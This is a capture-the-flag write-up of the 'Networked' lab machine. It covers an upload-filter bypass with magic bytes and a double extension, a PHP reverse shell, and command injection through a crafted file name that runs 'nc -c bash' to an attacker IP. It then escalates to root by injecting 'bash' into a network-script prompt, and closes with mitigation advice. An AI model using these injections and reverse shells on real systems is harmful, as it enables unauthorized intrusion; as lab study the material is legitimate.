# Networked

```
root@kali:/home/kali/htb/Networked# nmap -p- -sV -sC 10.129.112.184
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-12 08:28 EST
Nmap scan report for 10.129.112.184
Host is up (0.028s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.01 seconds
root@kali:/home/kali/htb/Networked# 
```

The webpage says:

```
Hello mate, we're building the new FaceMash!
Help by funding us and be the new Tyler&Cameron!
Join us at the pool party this Sat to get a glimpse 
```

I check the source code and see:

`<!-- upload and gallery not yet linked -->`


I google FaceMash, and it's the predecessor to facebook.


Tyler&Cameron refers to https://en.wikipedia.org/wiki/Winklevoss_twins 


http://10.129.112.184/uploads/ is empty.

in http://10.129.112.184/backup/ I find a file named backup.tar. I download it.

```
root@kali:/home/kali/htb/Networked# 7z x backup.tar 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 9 3900X 12-Core Processor             (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10240 bytes (10 KiB)

Extracting archive: backup.tar
--
Path = backup.tar
Type = tar
Physical Size = 10240
Headers Size = 4096
Code Page = UTF-8

Everything is Ok

Files: 4
Size:       5432
Compressed: 10240
root@kali:/home/kali/htb/Networked# ls
backup.tar  index.php  lib.php  photos.php  upload.php
root@kali:/home/kali/htb/Networked# 
```

I go to http://10.129.112.184/upload.php and upload a reverse shell.

I get `Invalid image file.`

from the upload.php file I see that the valid extensions are:

`$validext = array('.jpg', '.png', '.gif', '.jpeg');`

and that the program will not upload the file if it is invalid:

```
<?php
require '/var/www/html/lib.php';

define("UPLOAD_DIR", "/var/www/html/uploads/");

if( isset($_POST['submit']) ) {
  if (!empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];

    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;

    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
    if (!$success) {
        echo "<p>Unable to save file.</p>";
        exit;
    }
    echo "<p>file uploaded, refresh gallery</p>";

    // set proper permissions on the new file
    chmod(UPLOAD_DIR . $name, 0644);
  }
} else {
  displayform();
}
?>

```

And also lib.php:

```
<?php

function getnameCheck($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  #echo "name $name - ext $ext\n";
  return array($name,$ext);
}

function getnameUpload($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  return array($name,$ext);
}

function check_ip($prefix,$filename) {
  //echo "prefix: $prefix - fname: $filename<br>\n";
  $ret = true;
  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
    $ret = false;
    $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
  } else {
    $msg = $filename;
  }
  return array($ret,$msg);
}

function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
  if (function_exists('mime_content_type'))
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
    {
      return $file_type;
    }
  }
  return $file['type'];
}

function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}

function displayform() {
?>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
 <input type="file" name="myFile">
 <br>
<input type="submit" name="submit" value="go!">
</form>
<?php
  exit();
}


?>

```



I googled a couple of ways to get around this. And found this link: https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass

So I added GIF89a; on top of my php shell. And it worked! It got uploaded. I went to /photos.php to get the name, and then /uploads/10_10_14_20.jpg

But I get the error: `The image “http://10.129.112.184/uploads/10_10_14_20.jpg” cannot be displayed because it contains errors.` But no php connection.

from the link I read:

```
it may be possible to execute shellcode by inserting it into the Comment attribute of Image properties and saving it as file.jpg.php.


I'm not sure why some tutorials have the php extension first while others have it second. Try both.
```

So I save the file as shell.php.jpg and try again.

When I visit /photos.php I get the shell:

```
root@kali:/home/kali/htb/Networked# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.112.184 39312
Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 15:07:09 up  2:23,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$     
```

I try to improve my shell with `python -c 'import pty; pty.spawn("/bin/bash")'`

but it does not help.

```
bash-4.2$ pwd
pwd
/home/guly
bash-4.2$ ls -la
ls -la
total 28
drwxr-xr-x. 2 guly guly 159 Jul  9  2019 .
drwxr-xr-x. 3 root root  18 Jul  2  2019 ..
lrwxrwxrwx. 1 root root   9 Jul  2  2019 .bash_history -> /dev/null
-rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc
-rw-------  1 guly guly 639 Jul  9  2019 .viminfo
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly  33 Oct 30  2018 user.txt
bash-4.2$ cat check_attack.php
cat check_attack.php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
bash-4.2$ cat crontab.guly 
cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
```

So we have a cron running this php script.

The script uses lib.php

it finds all files in /var/www/html/uploads/

for each file it runs some checks, and if the check fails. the file is written to /tmp/attack.log which is deleted.

the original file is then removed with exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");

Where $path is '/var/www/html/uploads/' and $value is the name of the file.

We can abuse this by naming a file with `;` which ends the command after `nohup /bin/rm -f $path`

Then we can run additional commands. for example create a file named `; whoami`

Then the full command would be: `nohup /bin/rm -f /var/www/html/uploads/; whoami > /dev/null 2>&1 &`

`> /dev/null 2>&1 &` redirects the output to null. So we wont get any response. But, we can still run commands.

So we can create a file in /var/www/html/uploads/ with a name like `; nc -e bash 10.10.14.20 1338`
 
And the command should be ran.


```
touch '; nc -e bash 10.10.14.20 1338'
bash-4.2$ ls
ls
10_10_14_20.akamaihd.net.jpeg  127_0_0_2.png
10_10_14_20.jpg                127_0_0_3.png
10_10_14_20.new.jpeg           127_0_0_4.png
10_10_14_20.new2.php.jpeg      ; nc -e bash 10.10.14.20 1338
10_10_14_20.php.jpg            index.html
127_0_0_1.png
bash-4.2$ 

```

On the listener:

```
root@kali:/home/kali/htb/Networked# nc -nlvp 1338
Listening on 0.0.0.0 1338
Connection received on 10.129.112.184 59114
root@kali:/home/kali/htb/Networked# 

```


I got thrown out immediately.

I looked for some options:

https://www.commandlinux.com/man-page/man1/nc.1.html

```
-c string
    specify shell commands to exec after connect (use with caution). The string is passed to /bin/sh -c for execution. See the -e option if you don't have a working /bin/sh (Note that POSIX-conformant system must have one). 
-e filename
    specify filename to exec after connect (use with caution). See the -c option for enhanced functionality. 

Read more at: https://www.commandlinux.com/man-page/man1/nc.1.html

```


So I tried `touch '; nc -c bash 10.10.14.20 1338'`


```
root@kali:/home/kali/htb/Networked# nc -nlvp 1338
Listening on 0.0.0.0 1338
Connection received on 10.129.112.184 59124
whoami
guly
```


that worked out. I improved the shell:

```
script /dev/null -c bash
[guly@networked ~]$ ^Z
[1]+  Stopped                 nc -nlvp 1338
root@kali:/home/kali/htb/Networked# stty -raw echo
root@kali:/home/kali/htb/Networked# fg
nc -nlvp 1338
reset
reset: unknown terminal type unknown
Terminal type? xterm
xterm
Erase set to delete.
Kill set to control-U (^U).
Interrupt set to control-C (^C).
[guly@networked ~]$ export TERM=xterm
export TERM=xterm
[guly@networked ~]$ export SHELL=bash
export SHELL=bash
[guly@networked ~]$ id
id
uid=1000(guly) gid=1000(guly) groups=1000(guly)
[guly@networked ~]$ sudo -l
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
[guly@networked ~]$ 
```


So we see that guly has a root command.

```
cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
[guly@networked ~]$ ls -l /usr/local/sbin/changename.sh
ls -l /usr/local/sbin/changename.sh
-rwxr-xr-x 1 root root 422 Jul  8  2019 /usr/local/sbin/changename.sh
[guly@networked ~]$ 
```

We can see that this script is running with `/bin/bash -p`. This means privileged mode. So it will have root privileges.

I google network scripts: https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/s1-networkscripts-interfaces


```
Interface configuration files control the software interfaces for individual network devices. 
As the system boots, it uses these files to determine what interfaces to bring up and how to configure them. 
These files are usually named ifcfg-name, where name refers to the name of the device that the configuration file controls. 


The following is a sample ifcfg-eth0 file for a system using a fixed IP address:

DEVICE=eth0
BOOTPROTO=none
ONBOOT=yes
NETMASK=255.255.255.0
IPADDR=10.0.1.27
USERCTL=no
```

I then google network scripts exploits and find this: https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f

``` 
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh                                                                  
sudo /usr/local/sbin/changename.sh
interface NAME:
test bash
test bash
interface PROXY_METHOD:
test
test
interface BROWSER_ONLY:
test
test
interface BOOTPROTO:
test
test
[root@networked network-scripts]# whoami
whoami
root
[root@networked network-scripts]# 
```
so by naming the interface `anything` SPACE `bash` I will get the bash at the end of the script.


## Comparing myself to the official writeup:

They find the backup.tar file, and the php pages.

They use the same method I used. With adding the magic bytes of one of the supported files at the start.

They find the cronjob and the check_attack.php file.

They encode their command in base64, and name the file to decrypt the command.

they get root by naming the interface `abc /bin/bash`


## How to stop this exploit:

It's a bad idea to have a backup publicly available like that. It gives anyone access to the source code. And if there's any vulnerability there, it will be found.

The main issue here is that Apache is configured in a way which runs php no matter where it is in the filename. Making sure php is ran only when it is the extension would fix this issue.

I reckon the apache user should not have access to the user guly's files. This would have made the cronjob much harder to detect. And not being able to read the file would make it harder.

That being said, the command should be sanitized. So files cannot have the possibility of interrupting the original command.

Giving the user root access of any kind is risky. I would reccommend removing that possibility. I don't think the network-script exploit is patched. As it does not sound like the redhat team considers it an issue.

Therefore only root should have access to the network-scripts


